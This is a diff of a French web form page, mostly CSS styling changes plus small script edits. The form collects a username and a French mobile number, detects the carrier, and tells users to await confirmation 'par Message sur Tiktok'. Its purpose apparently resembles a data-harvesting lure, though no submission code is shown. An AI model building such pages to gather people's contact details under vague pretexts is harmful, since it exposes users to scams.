@@ -9,7 +9,7 @@
 
 *{
 box-sizing:border-box;
-font-family:Arial;
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
 }
 
 /* BACKGROUND */
@@ -23,7 +23,7 @@ align-items:center;
 
 background:linear-gradient(-45deg,#ffe600,#8a2be2,#ffe600,#8a2be2);
 background-size:400% 400%;
-animation:bgmove 10s infinite;
+animation:bgmove 8s infinite;
 
 color:white;
 }
@@ -44,11 +44,11 @@ padding:45px;
 border-radius:35px;
 
 background:rgba(255,255,255,0.15);
-backdrop-filter:blur(30px);
+backdrop-filter:blur(35px);
 
 box-shadow:
 0 20px 60px rgba(0,0,0,0.5),
-inset 0 0 25px rgba(255,255,255,0.2);
+inset 0 0 30px rgba(255,255,255,0.2);
 
 text-align:center;
 
@@ -69,7 +69,7 @@ line-height:1.6;
 margin-bottom:30px;
 }
 
-/* INPUT */
+/* INPUT STYLE */
 
 input{
 
@@ -77,16 +77,17 @@ width:100%;
 padding:16px;
 
 border:none;
-border-radius:35px;
+border-radius:40px;
 
 background:rgba(255,255,255,0.25);
 
-color:black;
 font-size:15px;
 
-transition:0.25s;
-
 margin-bottom:18px;
+
+transition:0.3s;
+
+color:black;
 
 }
 
@@ -97,7 +98,7 @@ color:black;
 font-weight:bold;
 }
 
-/* NEON FOCUS */
+/* LIQUID GLASS EFFECT */
 
 input:focus{
 
@@ -108,9 +109,8 @@ background:white;
 transform:scale(1.03);
 
 box-shadow:
-0 0 10px white,
-0 0 20px white,
-0 0 40px rgba(255,255,255,0.9);
+0 0 15px white,
+0 0 30px rgba(255,255,255,0.9);
 
 }
 
@@ -123,7 +123,7 @@ align-items:center;
 
 background:rgba(255,255,255,0.25);
 
-border-radius:35px;
+border-radius:40px;
 
 padding:10px 15px;
 
@@ -133,18 +133,17 @@ transition:0.3s;
 
 }
 
-/* PHONE NEON */
+/* FOCUS EFFECT */
 
 .phone:focus-within{
 
 background:white;
 
-box-shadow:
-0 0 10px white,
-0 0 20px white,
-0 0 40px rgba(255,255,255,0.9);
-
 transform:scale(1.03);
+
+box-shadow:
+0 0 15px white,
+0 0 30px rgba(255,255,255,0.9);
 
 }
 
@@ -180,7 +179,7 @@ width:100%;
 padding:16px;
 
 border:none;
-border-radius:35px;
+border-radius:40px;
 
 background:black;
 color:white;
@@ -190,7 +189,7 @@ font-weight:bold;
 
 cursor:pointer;
 
-transition:0.25s;
+transition:0.3s;
 
 }
 
@@ -216,6 +215,7 @@ font-size:18px;
 font-weight:bold;
 
 opacity:0;
+
 transition:0.4s;
 
 }
@@ -295,7 +295,7 @@ Veuillez saisir un <b>numéro français</b> appartenant à
 <b>Orange</b>, <b>SFR</b> ou <b>Bouygues Telecom</b>.
 </p>
 
-<input placeholder="Nom d'utilisateur">
+<input id="username" placeholder="Nom d'utilisateur">
 
 <div class="phone">
 
@@ -318,7 +318,7 @@ Veuillez saisir un <b>numéro français</b> appartenant à
 </div>
 
 <div id="success" class="success">
-✔ Merci, vos informations ont bien été envoyées.
+✔ Merci, vos informations ont bien été envoyées, Merci d'attendre la Confirmation par Message sur Tiktok.
 </div>
 
 </div>
@@ -330,6 +330,12 @@ function detectOperator(){
 let phone=document.getElementById("phone").value
 let op=document.getElementById("operator")
 let valid=document.getElementById("valid")
+
+if(phone.length < 2){
+op.classList.remove("show")
+valid.classList.remove("show")
+return
+}
 
 if(phone.startsWith("60")||phone.startsWith("61")){
 
@@ -351,7 +357,6 @@ op.innerHTML='<img class="logo" src="https://upload.wikimedia.org/wikipedia/comm
 
 else{
 
-op.innerHTML=""
 op.classList.remove("show")
 valid.classList.remove("show")
 return
@@ -366,6 +371,12 @@ valid.classList.add("show")
 /* ENVOI */
 
 function sendForm(){
+
+let phone=document.getElementById("phone").value
+
+if(phone.length<9){
+return
+}
 
 let loader=document.getElementById("loader")
 let success=document.getElementById("success")
